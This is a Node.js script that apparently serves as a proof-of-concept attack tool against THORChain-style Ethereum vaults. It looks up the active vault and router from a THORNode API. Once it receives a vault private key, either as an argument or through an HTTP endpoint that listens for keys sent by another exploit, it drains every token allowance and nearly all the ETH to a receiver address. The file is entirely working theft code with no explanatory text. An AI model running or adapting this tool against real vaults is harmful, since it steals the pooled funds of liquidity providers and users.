const util = require('util')
const path = require('path')
const chalk = require('chalk')
const express = require('express')
const axios = require('axios')
const Web3 = require('web3')
const log = console.log

const HTTP_PORT = 3000
const RPC_URL = 'http://192.168.1.100:8545'
const THORNODE_API_URL = 'http://192.168.1.100:1317/thorchain'
let receiverAddr = '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266'
const web3 = new Web3(RPC_URL)
const BN = web3.utils.BN;

let vaults = null

const routerABI = require('./rotuer-abi.json')
const tokens = {
  'TKN': '0x40bcd4db8889a8bf0b1391d0c819dcd9627f9d0a',
  'USDT': '0x3b7FA4dd21c6f9BA3ca375217EAD7CAb9D6bF483',
  'USDC': '0x992193f66E8A3aF935B6dfeFfd1C42CBC76c2026',
}

function printObj(obj) {
  console.log(util.inspect(obj, { colors: true, depth: 10 }))
}

async function getVaults() {
  if (vaults) return vaults
  vaults = {}
  let resp = await axios.get(path.join(THORNODE_API_URL, 'inbound_addresses'))
  for (const item of resp.data) {
    vaults[item.chain] = {
      address: item.address,
      coins: []
    }
  }
  resp = await axios.get(path.join(THORNODE_API_URL, 'vaults/asgard'))
  const activeVault = resp.data[resp.data.length - 1]
  if (activeVault.coins) {
    for (const coin of activeVault.coins) {
      const [chain, token] = coin.asset.split('.')
      vaults[chain].coins.push({
        token,
        amount: parseInt(coin.amount) / 1e8
      })
    }
  }
  for (const item of activeVault.routers) {
    vaults[item.chain].router = item.router
  }

  return vaults
}

async function drainETHVault(privKey, vault) {
  const acc = web3.eth.accounts.privateKeyToAccount('0x' + privKey)
  web3.eth.accounts.wallet.add(acc);
  web3.eth.defaultAccount = acc.address
  const router = new web3.eth.Contract(routerABI, vault.router)
  const allowances = await getVaultBalances(vault)
  log(chalk.red(`=> Transfering assets`))
  for (const tknName in tokens) {
    if (new BN(allowances[tknName]).gt(new BN(0))) {
      log(`[+] Withdraw ${chalk.yellow(web3.utils.fromWei(allowances[tknName]))} ${tknName} from router (${vault.router}) to ${receiverAddr}`)
      const tx = await router.methods.transferOut(receiverAddr, tokens[tknName], allowances[tknName], '').send({ from: acc.address, gasLimit: 500000 })
      log(`    => tx: ${tx.transactionHash}`)
    }
  }
  const remainETH = await web3.eth.getBalance(vault.address)
  const amount = new BN(remainETH).sub(new BN('2000000000000000'))
  log(`[+] Transfer remaining ${chalk.yellow(web3.utils.fromWei(amount))} ETH from vault (${vault.address}) to ${receiverAddr}`)
  const tx = await web3.eth.sendTransaction({ to: receiverAddr, value: amount, gasLimit: 500000 })
  log(`    => tx: ${tx.transactionHash}`)
}

async function drainVaultsImpl(privkey) {
  if (!privkey) return
  const vaults = await getVaults()
  const vault = vaults['ETH']
  const acc = web3.eth.accounts.privateKeyToAccount('0x' + privkey)
  if (vault.address.toLowerCase() == acc.address.toLowerCase()) {
    log(chalk.yellow(`[+] Got private key for vault: ${chalk.green(vault.address)},`), `privateKey: ${chalk.green(privkey)}`)
    log(chalk.red(`=> Withdraw all assets to ${chalk.green(receiverAddr)}`))
    await drainETHVault(privkey, vault)
  }
}

async function drainVaults(receiver, privkey) {
  receiverAddr = receiver
  if (privkey) {
    await drainVaultsImpl(privkey)
  } else {
    const app = express()
    app.use(express.json());
    app.post('/privkey', async (req, res) => {
      const { privkey } = req.body
      await drainVaultsImpl(privkey)
      res.sendStatus(200);
      process.exit(0)
    })
    app.listen(HTTP_PORT, () => {
      log(`Waiting for private keys. (listening on http://192.168.1.100:${HTTP_PORT}/privkey)`)
    })
  }
}

async function getVaultBalances(vault) {
  log(`Checking vault balances: ${chalk.green(vault.address)}`)
  const bal = await web3.eth.getBalance(vault.address)
  const router = new web3.eth.Contract(routerABI, vault.router)
  log(`[+] ETH balance: ${chalk.yellow(web3.utils.fromWei(bal))}`)
  log(`[+] Token balances:`)
  const allowances = {}
  for (const tknName in tokens) {
    const tknAddr = tokens[tknName]
    const amount = await router.methods.vaultAllowance(vault.address, tknAddr).call()
    allowances[tknName] = amount
    log(`    ${tknName}: ${chalk.yellow(web3.utils.fromWei(amount))}`)
  }
  return allowances
}

const main = async () => {
  const args = process.argv.slice(2);
  const cmd = args[0]
  if (cmd == 'vault') {
    const vaults = await getVaults()
    await getVaultBalances(vaults['ETH'])
  }
  if (cmd == 'drain') {
    drainVaults(args[1], args[2])
  }
}

main()
